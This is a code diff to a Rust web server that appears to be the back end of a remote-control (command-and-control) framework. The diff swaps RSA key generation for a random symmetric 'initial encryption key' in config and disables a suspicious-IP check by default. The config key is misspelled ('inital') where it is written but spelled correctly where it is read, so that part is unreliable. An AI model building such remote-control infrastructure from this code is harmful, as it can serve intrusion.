@@ -22,32 +22,17 @@ use crate::libraries::miscellaneous::general::*;
 use std::{
     fs, str, fs::File,
     io::Write, process::exit,
-    process::Command,
     path::Path, 
     sync::{Arc, RwLock},
 };
 
-use rsa::{
-    pkcs1::{
-        DecodeRsaPrivateKey, 
-        EncodeRsaPrivateKey, 
-        EncodeRsaPublicKey
-    }, 
-    Pkcs1v15Encrypt, 
-    RsaPrivateKey, 
-    RsaPublicKey
-};
-
-
 use mysql_async::{*, prelude::*};
 
-use colored::Colorize;
 use lazy_static::lazy_static;
 use crate::serde_json::json;
 use serde_json;
 use sha256;
-use rand::{self, random};
-
+use std::process::Command;
 
 lazy_static! {
     static ref CONNECTION_INTERVAL: Arc<RwLock<u64>> = Arc::new(RwLock::new(0));
@@ -57,7 +42,7 @@ lazy_static! {
     static ref API_SECRET: Arc<RwLock<String>> = Arc::new(RwLock::new(String::from("root")));
     static ref CONNECTION_POOL: Arc<RwLock<Pool>> = Arc::new(RwLock::new(Pool::from_url("mysql://unknown:unknown@1.1.1.1:1000/database").unwrap()));
     static ref IP_DATABASE: Arc<RwLock<Vec<u8>>> = Arc::new(RwLock::new(vec![u8::from(0)]));
-    static ref PRIVATE_KEY: Arc<RwLock<RsaPrivateKey>> = Arc::new(RwLock::new(RsaPrivateKey::new(&mut rand::thread_rng(), 16).unwrap()));
+    static ref INITIAL_ENCRYPTION_KEY: Arc<RwLock<String>> = Arc::new(RwLock::new(String::new()));
     static ref HOST: Arc<RwLock<String>> = Arc::new(RwLock::new(String::new()));
     static ref SUSPICIOUS_IP_CHECK: Arc<RwLock<bool>> = Arc::new(RwLock::new(false));
     static ref MAX_OUTPUT_SUBMISSION_KB: Arc<RwLock<u64>> = Arc::new(RwLock::new(0));
@@ -80,7 +65,7 @@ const CHARSET: &str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ12345
 #[actix_web::main]
 async fn main() -> std::io::Result<()> {
     #[cfg(target_os = "windows")]
-    let enabled = colored::control::set_virtual_terminal(true).unwrap();
+    colored::control::set_virtual_terminal(true).unwrap();
 
     #[cfg(target_os = "linux")]
     Command::new("ulimit").arg("-n").arg("524288");
@@ -98,7 +83,6 @@ async fn main() -> std::io::Result<()> {
 
     fs::create_dir_all("artifacts/storages").unwrap();
     fs::create_dir_all("artifacts/configuration").unwrap();
-    fs::create_dir_all("artifacts/keys").unwrap();
     fs::create_dir_all("artifacts/databases").unwrap();
 
     match json_config {
@@ -107,7 +91,9 @@ async fn main() -> std::io::Result<()> {
             write!(File::create("artifacts/configuration/server_config.json").unwrap(), "{}", serde_json::to_string_pretty(
                 &json!({
                     "api_secret": generate(64, CHARSET),
+                    "inital_encryption_key": generate(32, CHARSET),
                     "gateway_path": generate(16, CHARSET),
+                    "useragent": generate(16, CHARSET),
 
                     "connection_interval": 300,
                     "connection_interval_buffer": 10,
@@ -116,7 +102,7 @@ async fn main() -> std::io::Result<()> {
                     "max_output_submission_kb": 10000,
 
                     "enable_firewall": true,
-                    "suspicious_ip_check": true,
+                    "suspicious_ip_check": false,
 
                     "mysql_server": "mysql://root:root@127.0.0.1:3306/database",
                     "host": "0.0.0.0:80",
@@ -151,23 +137,12 @@ async fn main() -> std::io::Result<()> {
         }
     };
 
-    if !Path::new("artifacts/keys/private.pem").exists() {
-        let mut rng = rand::thread_rng();
-        let priv_key = RsaPrivateKey::new(&mut rng, 2048).expect("failed to generate a key");
-        let pub_key = RsaPublicKey::from(&priv_key);
-        
-        priv_key.write_pkcs1_pem_file("artifacts/keys/private.pem", rsa::pkcs1::LineEnding::LF).unwrap();
-        pub_key.write_pkcs1_pem_file("artifacts/keys/public.pem", rsa::pkcs1::LineEnding::LF).unwrap();
-
-        fprint("success", "RSA key pair was created, since there wasn't one before.");
-    }
-
     *CONNECTION_POOL.write().unwrap() = connection_pool.clone();
     *CONNECTION_INTERVAL.write().unwrap() = key_to_u64(&parsed_json_config, "connection_interval");
     *PURGATORY_INTERVAL.write().unwrap() = key_to_u64(&parsed_json_config, "purgatory_interval");
     *ENABLE_FIREWALL.write().unwrap() = key_to_bool(&parsed_json_config, "enable_firewall");
     *API_SECRET.write().unwrap() = key_to_string(&parsed_json_config, "api_secret");
-    *PRIVATE_KEY.write().unwrap() = RsaPrivateKey::from_pkcs1_pem(&fs::read_to_string("artifacts/keys/private.pem").unwrap()).unwrap();
+    *INITIAL_ENCRYPTION_KEY.write().unwrap() = key_to_string(&parsed_json_config, "initial_encryption_key");
     *IP_DATABASE.write().unwrap() = geolite_db.unwrap();
     *HOST.write().unwrap() = key_to_string(&parsed_json_config, "host");
     *CONNECTION_INTERVAL_BUFFER.write().unwrap() = key_to_u64(&parsed_json_config, "connection_interval_buffer");
